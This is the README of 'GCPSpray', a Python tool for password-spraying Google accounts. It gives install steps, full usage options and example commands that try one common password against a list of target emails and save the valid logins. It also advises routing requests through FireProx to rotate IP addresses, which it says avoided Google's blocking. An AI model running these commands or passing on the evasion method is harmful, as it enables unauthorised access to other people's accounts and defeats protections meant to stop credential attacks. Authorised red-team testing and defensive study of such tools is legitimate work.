# GCPSpray

This script will perform password spraying against Google Cloud Plataform (GCP).

This tool works well with [FireProx](https://github.com/ustayready/fireprox) to rotate source IP addresses on authentication requests. In testing this appeared to avoid getting blocked by Google.

## Quick Start
### Requirements

You will need to install the python library `requests`. You can do this by running:
```
pip3 install requests
```

### Usage

You will need a userlist file with target email-addresses one per line. 
```
usage: GCPSpray.py [-h] -u FILE -p PASSWORD [-o OUTFILE] [-f] [--url URL]

optional arguments:
  -h, --help            show this help message and exit
  -u FILE, --userlist FILE
                        File filled with usernames one-per-line in the format
                        'user@domain.com'. (Required)
  -p PASSWORD, --password PASSWORD
                        A single password that will be used to perform the
                        password spray. (Required)
  -o OUTFILE, --out OUTFILE
                        A file to output valid results to.
  --url URL             The URL to spray against (default is
                        https://accounts.google.com). Potentially useful if
                        pointing at an API Gateway URL generated with
                        something like FireProx to randomize the IP address
                        you are authenticating from.

EXAMPLE USAGE:
This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
    python3 GCPSpray.py --userlist ./userlist.txt --password Winter2020

This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
    python3 GCPSpray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
```
